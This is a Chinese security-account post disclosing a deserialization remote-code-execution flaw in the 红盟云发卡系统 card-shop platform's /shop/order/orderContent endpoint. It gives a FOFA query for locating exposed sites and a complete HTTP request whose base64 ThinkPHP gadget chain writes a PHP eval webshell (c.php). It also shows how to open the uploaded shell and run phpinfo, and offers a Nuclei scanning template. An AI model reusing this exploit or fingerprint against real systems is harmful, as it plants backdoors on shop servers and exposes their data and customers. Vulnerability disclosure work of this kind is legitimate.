#  红盟云发卡系统存在反序列化RCE漏洞   
原创 四月安全  四月安全   2024-07-10 23:00  
  
**0x0**  
  
免责声明  
  
**本文仅用于技术学习和讨论。请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。**  
  
**0x1**  
  
漏洞介绍  
  
红盟云发卡系统  
/shop/order/orderContent接口存在反序列化漏洞导致RCE  
  
**0x2**  
  
资产测绘  
```
fofa："/assets/shop/dist/uaredirect.js?v=1.2.0"
```  
  
  
  
**0x3**  
  
漏洞复现  
  
访问漏洞接口"  
/shop/order/orderContent"，发送如下poc进行文件上传操作  
```
POST /shop/order/orderContent?order_no=123 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=0n0jkgs67ogri9tf3qkdbbuckq; tourist=17206019455880
Priority: u=1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Content-Length: 1141

search_content=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eHgiO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTozNjAwO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjEyMjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWFhYVBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZGpZMk1uWFNrN1B6NGcvLi4vYy5waHAiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czo2OiIAKgB0YWciO3M6MzoieHh4Ijt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fX1zOjY6InBhcmVudCI7cjoxMTt9fX0%3D
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoR9ibqNPsvX5s2DqA2kuOf79YHhoSSu9LIXtEmnWmWgYZtw6s06d8pHblhgrSyuzgNXnxIhibsiao3ag/640?wx_fmt=png&from=appmsg "")  
  
回显红色箭头所指内容即上传成功，访问上传文件  
```
c.php12ac95f1498ce51d2d96a249c09c1998.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoR9ibqNPsvX5s2DqA2kuOf79zFriacx68fic2ZqdoGib3AibYwnur8UJMglFHlo9SKus4B75dicmgn7wffA/640?wx_fmt=png&from=appmsg "")  
  
执行phpinfo  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoR9ibqNPsvX5s2DqA2kuOf79zWPjQE6tWEpxX9Oyp4UKom17jnDRAyLOclHfSlT7EEZT4sYLtY52eg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x4**  
  
Nuclei脚本  
  
关注公众号："  
四月安全" ，回复  "  
hongmeng_fk_rce"  获取  
 Nuclei 脚本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoR9ibqNPsvX5s2DqA2kuOf79447JWyEgSQEOAicLPBkNtYAGwZB6ICjhcduEm6mq6je2teayKqApic2A/640?wx_fmt=png&from=appmsg "")  
  
  
